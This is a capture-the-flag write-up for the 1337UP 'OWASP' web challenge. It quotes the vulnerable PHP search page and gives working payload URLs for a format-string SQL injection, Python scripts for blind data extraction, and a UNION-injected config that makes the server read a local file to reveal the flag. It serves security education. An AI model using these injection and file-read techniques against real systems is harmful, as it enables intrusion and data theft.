---
title: "1337UP web/OWASP"
publishDate: "20 Nov 2023"
description: "Author: cpp.dog"
tags: ["web", "1337up"]
---

#### Description

Everyone knows the OWASP top 10 are vulnerable, I guess this might be too 💀

Author: Ivars Vids

#### Code inspection

Sourceless.

P.S.
After CTF has ended, some participants shared the dirbusted source file.
`https://owasp.ctf.intigriti.io/search.php.save`

Please note that we didn't know about this file, because dirbusting is generally prohibited in most CTFs, unless it is explicitly stated in the challenge description. 

So we were desperately guessing every possible shit out there.
```php
<?php
require_once('db.php');
$flag = file_get_contents('/flag.txt');
@include('header.php');

//build sql query
$sql = 'select * from owasp';
$sql_where = '';
foreach ($_REQUEST as $field => $value){
  if ($sql_where) $sql_where = " AND $sql_where";
  $sql_where = "position(%s in $field) $sql_where";
  try {
    $sql_where = @vsprintf($sql_where, Array("'". sqlesc($value) . "'"));
  } catch (ValueError | TypeError $e) {
    $sql_where = '';
  }
  if (preg_match('/[^a-z0-9\.\-_]/i', $field)) die ('Hacking attempt!');
}
$sql .= ($sql_where)?" where $sql_where":'';

foreach(sqlquery($sql) as $row){
  @include('row.php');
  $config = json_decode($row['config'], true);
}

if (isset($config['flag']) && $config['flag']){
  $url = $config['url'];
  // no printer manufacturer domains
  if (preg_match('/canon|epson|brother|hp|minolta|sharp|dell|oki|samsung|xerox|lexmark/i', $url)) die('Looks like a printer!');
//  $url = 'https://www.youtube.com/watch?v=2U3Faa3DejQ';
  if (filter_var($url, FILTER_VALIDATE_URL)) {
    $http_resp = file_get_contents($url);
    var_dump($http_resp);
    if ($flag === $http_resp){
      die('Yes! You got the right flag!');
    }
    die('Wrong flag');
  }
  else {
    die('URL does not start with HTTP or HTTPS protocol!');
  }
}

@include('footer.php');
```

#### Fuzzing

We didn't see much of the possible attack vectors on the site, the only interesting thing at quick glance is search field. Which just GETs the `search.php`.

`https://owasp.ctf.intigriti.io/search.php?title=1`

SQL injection is definitely the first thing to try here, so we tried something like this:

`https://owasp.ctf.intigriti.io/search.php?title='"/`

No errors were produced with this input. We thought "what if we add another random query parameter?" and, to our surprise, it worked just fine and produced a mysql exception.

`https://owasp.ctf.intigriti.io/search.php?title=%27%22%2F&abacaba=123`


```py
Fatal error: Uncaught mysqli_sql_exception: Unknown column 'abacaba' in 'where clause' in /var/www/html/db.php:11 
Stack trace: 
#0 /var/www/html/db.php(11): mysqli->query('select * from o...') #1 /var/www/html/search.php(21): sqlquery('select * from o...') #2 {main} thrown in /var/www/html/db.php on line 11
```

After several attempts, we discovered that query string parameters must match the following regex pattern: `/[a-z0-9_-]/i`. Dots and spaces are replaced with underscores `_`. However, the `-` char is permitted, we immediately tried to exploit it to comment out the rest of the query, which may reveal a portion of it and help us understand what to do next.

`https://owasp.ctf.intigriti.io/search.php?b=1&1=321&--=123`

```py
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ') AND position('321' in 1) AND position('1' in b)' at line 1 in /var/www/html/db.php:11 
Stack trace: 
#0 /var/www/html/db.php(11): mysqli->query('select * from o...') #1 /var/www/html/search.php(21): sqlquery('select * from o...') #2 {main} thrown in /var/www/html/db.php on line 11
```

So it adds `AND position('value' in key)` for every query parameter in reversed order. Interesting. Looks like we can try format string injection.

`https://owasp.ctf.intigriti.io/search.php?a=%1$s)  AND 0;--&id=1`

```py
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1') AND 0;--' in a)' at line 1 in /var/www/html/db.php:11 
Stack trace: 
#0 /var/www/html/db.php(11): mysqli->query('select * from o...') #1 /var/www/html/search.php(21): sqlquery('select * from o...') #2 {main} thrown in /var/www/html/db.php on line 11
```

We were right about format string injection! It seems we need to prepend the format string with an opening parenthesis and prefix the second parameter with `in title)` in order to get something interesting for us.

`https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) OR 0 AND POSITION(`

The payload above returns empty article set, now we can extract everything.
Upon iterating over the information_schema.tables, we found an additional table called `flag`, with column `flag`. Let's dump it!

```py
from cr3.web.brute import trie_brute
from cr3.regex.solver import solve

def callback(flag, c, _):
  return None, f"https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) OR (SELECT COUNT(flag) FROM flag where HEX(SUBSTR(flag,{len(flag) + 1},1)) = HEX({hex(ord(c))})) > 0 AND POSITION("

flag = trie_brute(success="<h3>", pre_request_callback=callback)
```

`https://www.youtube.com/watch?v=dQw4w9WgXcQ`

And here we go, rickroll...

Well, we also found an additional column in article table named `config`. Let's dump it too.

```py
from cr3.web.brute import trie_brute
from cr3.regex.solver import solve

def callback(flag, c, _):
  return None, f"https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) OR (SELECT GROUP_CONCAT(config) FROM owasp where HEX(SUBSTR(config,{len(flag) + 1},1)) = HEX({hex(ord(c))})) > 0 AND POSITION("

flag = trie_brute(success="<h3>", pre_request_callback=callback)
```

```json
{}, {"__proto__":{"flag": "https://www.youtube.com/watch?v=Ct6BUPvE2sM"}}, {}, {"flag":false}, {}, [], 1337, "1337UP", null
```

It's JSON and there's new youtube link with another rickroll. 
`https://www.youtube.com/watch?v=Ct6BUPvE2sM`

But what happens if we give it our own config, with something like this `{"flag":true}`?

`https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) UNION SELECT 1,2,3, 0x7B22666C6167223A747275657D;-- AND POSITION(`

```py
Warning: Undefined array key "url" in /var/www/html/search.php on line 27

Deprecated: preg_match(): Passing null to parameter 
#2 ($subject) of type string is deprecated in /var/www/html/search.php on line 29
URL does not start with HTTP or HTTPS protocol!
```

Let's try passing this value: `{"flag":true,"url":"link-to-webhooks"}`.
`https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) UNION SELECT 1,2,3, 0x7B22666C6167223A747275652C2275726C223A2268747470733A2F2F776562686F6F6B2E736974652F32623037613133312D646534362D343135332D626561662D343036633265353831396132227D;-- AND POSITION(`

```py
string(140) 
"This URL has no default content configured. View in Webhook.site." 
Wrong flag
```

Since they check the domain, we tried LFI.
`https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) UNION SELECT 1,2,3, 0x7B22666C6167223A747275652C2275726C223A2266696C653A2F2F2F666C61672E747874227D;-- AND POSITION(`

```py
string(40) 
"INTIGRITI{php_n4n0_5ql1_lf1_53cr37_fl46}" 
Yes! You got the right flag!
```

#### Flag
`INTIGRITI{php_n4n0_5ql1_lf1_53cr37_fl46}`